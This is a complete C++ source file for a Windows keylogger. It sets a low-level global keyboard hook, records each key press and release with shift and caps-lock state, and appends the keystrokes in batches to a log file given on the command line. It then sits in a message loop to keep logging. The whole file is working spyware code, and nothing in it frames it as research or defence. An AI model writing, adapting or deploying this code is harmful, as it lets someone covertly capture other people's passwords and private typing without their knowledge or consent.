#define _CRT_SECURE_NO_WARNINGS
#include <cstdlib>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <windows.h>

std::string fileName;
std::vector<std::string> codepointStringBuffer;

static BOOL CapsLockIsToggledOn() {
    return (GetKeyState(VK_CAPITAL) & 0x1) != 0;
}

static BOOL LeftShiftIsDown() {
    return (GetKeyState(VK_LSHIFT) & 0x8000) != 0;
}

static BOOL RightShiftIsDown() {
    return (GetKeyState(VK_RSHIFT) & 0x8000) != 0;
}

static void DumpCharacterBuffer() {

    std::ofstream ofs(fileName, std::ios_base::app);
    
    for (const std::string& codepointString : codepointStringBuffer) {
        ofs << codepointString;    }

    codepointStringBuffer.clear();
    ofs.close();
}

LRESULT CALLBACK KeyboardProc(int nCode,
                              WPARAM wParam, 
                              LPARAM lParam) {

    PKBDLLHOOKSTRUCT pHookStruct = (PKBDLLHOOKSTRUCT) lParam;
    int vkCode = pHookStruct->vkCode;

    switch (wParam) {
        case WM_KEYUP:
        case WM_SYSKEYUP:

            if (vkCode == VK_LSHIFT) {
                codepointStringBuffer.push_back(std::string("\nVK_LSHIFT up"));
            } else if (vkCode == VK_RSHIFT) {
                codepointStringBuffer.push_back(std::string("\nVK_RSHIFT up"));
            } else if (vkCode == VK_LMENU) {
                codepointStringBuffer.push_back(std::string("\nVK_LMENU up"));
            } else if (vkCode == VK_RMENU) {
                codepointStringBuffer.push_back(std::string("\nVK_RMENU up"));
            } else if (vkCode == VK_CAPITAL) {
                codepointStringBuffer.push_back(std::string("\nVK_CAPITAL up"));
            } else if (!std::isalnum(vkCode)) {
                // Handle the remaining key codes:
                std::stringstream ss;
                ss << "0x";
                ss << std::hex << std::uppercase << vkCode;
                std::string s;
                ss >> s;
                std::string codepointString = "\n" + s + " up";
                codepointStringBuffer.push_back(codepointString);
            }

            break;

        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:

            if (vkCode == VK_LSHIFT) {
                codepointStringBuffer.push_back(std::string("\nVK_LSHIFT down"));
            } else if (vkCode == VK_RSHIFT) {
                codepointStringBuffer.push_back(std::string("\nVK_RSHIFT down"));
            } else if (vkCode == VK_LMENU) {
                codepointStringBuffer.push_back(std::string("\nVK_LMENU down"));
            } else if (vkCode == VK_RMENU) {
                codepointStringBuffer.push_back(std::string("\nVK_RMENU down"));
            } else if (vkCode == VK_SPACE) {
                codepointStringBuffer.push_back(std::string("\nSPACE>"));
            } else if (vkCode == VK_CAPITAL) {
                codepointStringBuffer.push_back(std::string("\nVK_CAPITAL down"));
            } else if (vkCode == VK_RETURN) {
                codepointStringBuffer.push_back(std::string("\nRETURN"));
            } else if (vkCode == VK_BACK) {
                codepointStringBuffer.push_back(std::string("\nBACKWARDS"));
            } else if (vkCode == VK_TAB) {
                codepointStringBuffer.push_back(std::string("\nTAB"));
            } else if (std::isdigit(vkCode)) {
                std::string s{ (char) vkCode };
                codepointStringBuffer.push_back(std::string("\n"));
                codepointStringBuffer.push_back(s);
            } else if (std::isalpha(vkCode)) {
                char ch = (char) vkCode;

                BOOL lowerCase;

                if (LeftShiftIsDown() || RightShiftIsDown()) {
                    lowerCase = !CapsLockIsToggledOn();
                } else {
                    lowerCase = CapsLockIsToggledOn();
                }

                if (lowerCase) {
                    std::string s{ ch };
                    codepointStringBuffer.push_back(std::string("\n"));
                    codepointStringBuffer.push_back(s);
                } else {
                    std::string s{ (char)(ch + 32) };
                    codepointStringBuffer.push_back(std::string("\n"));
                    codepointStringBuffer.push_back(s);
                }
            } else {
                // Handle the remaining key codes:
                std::stringstream ss;
                ss << "0x";
                ss << std::hex << std::uppercase << vkCode;
                std::string s;
                ss >> s;
                std::string codepointString = "\n" + s + " down";
                codepointStringBuffer.push_back(codepointString);
            }

            break;
    }

    if (codepointStringBuffer.size() >= 13) {
        DumpCharacterBuffer();
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WinMain(HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPSTR pCmdLine,
            int nCmdShow) {

    fileName = pCmdLine;    

    // Mark the start of session:
    std::ofstream ofs(fileName, std::ios_base::app);
    ofs << "<START>";
    ofs.close();

    SetWindowsHookExA(WH_KEYBOARD_LL,
                      KeyboardProc,
                      NULL,
                      0);
    MSG msg;
        
    // Just seat in the memory while logging. :^)
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return EXIT_SUCCESS;
}